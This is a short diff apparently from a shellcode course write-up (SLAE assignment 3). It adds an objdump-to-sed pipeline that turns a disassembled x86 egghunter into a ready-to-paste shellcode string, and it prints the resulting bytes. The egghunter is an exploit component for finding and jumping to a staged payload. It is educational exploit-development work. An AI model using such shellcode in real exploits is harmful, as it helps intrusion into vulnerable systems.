@@ -65,3 +65,9 @@ Disassembly of section .text:
  8048083:       75 e6                   jne    804806b <search>
  8048085:       ff e7                   jmp    edi
 root@kali:/home/SLAE/MY_EXP/Assignment3#
+
+Obtain the Egghunter Shellcodes for this EggHunter_assignment3
+
+root@kali:/home/SLAE/MY_EXP/Assignment3# objdump -d ./EggHunter_assignment3|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+"\x31\xdb\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x74\x30\x30\x6c\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7"
+
